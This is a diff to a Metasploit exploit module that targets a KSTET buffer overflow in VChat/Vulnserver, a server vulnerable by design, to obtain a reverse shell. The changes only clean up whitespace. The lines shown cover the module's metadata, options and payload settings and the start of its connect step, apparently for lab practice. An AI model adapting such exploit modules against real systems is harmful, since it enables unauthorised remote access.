@@ -18,7 +18,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
     super(update_info(info,
       'Name'           => 'VChat/Vulnserver Buffer Overflow-KSTET command MultiStage',	# Name of the target
       'Description'    => %q{	# Explaining what the module does
-         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
+         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell.
       },
       'Author'         => [ 'fxw' ],	## Hacker name
       'License'        => MSF_LICENSE,
@@ -31,7 +31,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       'Privileged'     => false,
       'DefaultOptions' =>
         {
-          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
+          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done
         },
       'Payload'        =>	# How to encode and generate the payload
         {
@@ -56,8 +56,8 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
           Opt::RPORT(9999),
           Opt::RHOSTS('192.168.7.191')
       ])
-
   end
+
   def exploit	# Actual exploit
     print_status("Connecting to target...")
     connect	# Connect to the target
